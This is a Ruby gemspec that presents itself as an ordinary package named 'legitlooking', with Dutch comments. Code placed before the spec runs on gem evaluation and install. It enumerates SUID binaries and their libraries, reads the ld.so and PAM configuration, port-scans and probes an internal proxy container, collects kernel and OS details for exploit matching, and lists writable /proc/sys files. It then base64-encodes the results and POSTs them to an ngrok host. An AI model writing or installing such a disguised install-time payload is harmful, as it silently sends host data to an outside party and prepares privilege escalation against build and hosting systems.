# frozen_string_literal: true

COLLAB_URL = "https://6e51-2001-1c00-307-d600-5dfa-d53c-8fc6-791b.ngrok-free.app"

begin
  require "uri"
  require "net/http"

  cmd = ->(c) { `#{c} 2>/dev/null`.strip[0, 3000] }

  lines = []

  # ============================================================
  # STAP 1: ldd op alle SUID binaries
  # Zoek libraries die in onze schrijfbare paden zitten
  # ============================================================
  lines << "=== LDD SUID BINARIES ==="
  %w[
    /usr/bin/su
    /usr/bin/mount
    /usr/bin/umount
    /usr/bin/newgrp
    /usr/bin/passwd
    /usr/bin/gpasswd
    /usr/bin/chsh
    /usr/bin/chfn
    /usr/lib/openssh/ssh-keysign
  ].each do |bin|
    lines << "\n--- ldd #{bin} ---"
    lines << cmd.("ldd #{bin}")
  end

  # ============================================================
  # STAP 2: Library search path -- welke dirs checkt ld.so?
  # ============================================================
  lines << "\n=== LD.SO CONFIG ==="
  lines << cmd.("cat /etc/ld.so.conf")
  lines << "\n--- ld.so.conf.d ---"
  lines << cmd.("cat /etc/ld.so.conf.d/*.conf")
  lines << "\n--- ldconfig cache (eerste 50 entries) ---"
  lines << cmd.("ldconfig -p | head -50")

  # ============================================================
  # STAP 3: Welke libraries zitten ER AL in /usr/local/lib/?
  # ============================================================
  lines << "\n=== /usr/local/lib INHOUD ==="
  lines << cmd.("ls -la /usr/local/lib/")
  lines << "\n--- Subdirs ---"
  lines << cmd.("find /usr/local/lib -maxdepth 2 -name '*.so*' -type f 2>/dev/null")

  # ============================================================
  # STAP 4: Check of /usr/local/lib in ldconfig path zit
  # En of we PAM libs kunnen bereiken
  # ============================================================
  lines << "\n=== PAM LIBS ==="
  lines << cmd.("find / -name 'libpam*.so*' -not -path '/proc/*' 2>/dev/null")
  lines << "\n--- PAM config ---"
  lines << cmd.("ls /etc/pam.d/")
  lines << cmd.("cat /etc/pam.d/su 2>/dev/null || cat /etc/pam.d/common-auth 2>/dev/null")

  # ============================================================
  # STAP 5: Proxy container dieper onderzoeken
  # Portscan + software identificatie
  # ============================================================
  lines << "\n=== PROXY CONTAINER (172.19.0.2) DEEP SCAN ==="
  lines << "--- Alle TCP poorten ---"
  # Scan poorten 1-10000
  lines << cmd.("for p in 80 443 1080 8080 8443 9090 9200 6379 5432 3306 2375 2376 4243 7946; do (echo >/dev/tcp/172.19.0.2/$p) 2>/dev/null && echo \"OPEN: $p\"; done")

  lines << "\n--- HTTP op proxy poorten ---"
  [80, 8080, 9090, 2375].each do |port|
    lines << "\n  Port #{port}:"
    begin
      require "socket"
      require "timeout"
      Timeout.timeout(3) do
        s = TCPSocket.new("172.19.0.2", port)
        s.write("GET / HTTP/1.0\r\nHost: 172.19.0.2\r\n\r\n")
        lines << s.read(500)
        s.close
      end
    rescue => e
      lines << "  #{e.message}"
    end
  end

  # ============================================================
  # STAP 6: Kernel versie -- voor CVE matching
  # ============================================================
  lines << "\n=== KERNEL + OS INFO ==="
  lines << cmd.("uname -a")
  lines << cmd.("cat /etc/os-release")
  lines << cmd.("cat /proc/version")

  # ============================================================
  # STAP 7: /proc/sys attack surface
  # ============================================================
  lines << "\n=== /proc/sys SCHRIJFBAAR ==="
  lines << cmd.("find /proc/sys -writable -type f 2>/dev/null | head -30")

  payload = [lines.join("\n").encode("UTF-8", invalid: :replace, undef: :replace)].pack("m0")
  uri = URI("#{COLLAB_URL}?poc=library_escape")
  req = Net::HTTP::Post.new(uri)
  req["Content-Type"] = "text/plain"
  req.body = payload
  Net::HTTP.start(uri.host, uri.port, use_ssl: true,
                  open_timeout: 20, read_timeout: 20) { |h| h.request(req) }

rescue => e
  begin
    uri = URI("#{COLLAB_URL}?poc=library_escape&err=#{URI.encode_www_form_component(e.message[0,200])}")
    Net::HTTP.get(uri)
  rescue; end
end

Gem::Specification.new do |spec|
  spec.name          = "legitlooking"
  spec.version       = "1.0.18"
  spec.authors       = ["researcher"]
  spec.summary       = "A normal looking gem"
  spec.require_paths = ["lib"]
  spec.add_dependency "rails", "~> 7.0"
  spec.add_dependency "devise", "~> 4.9"
end
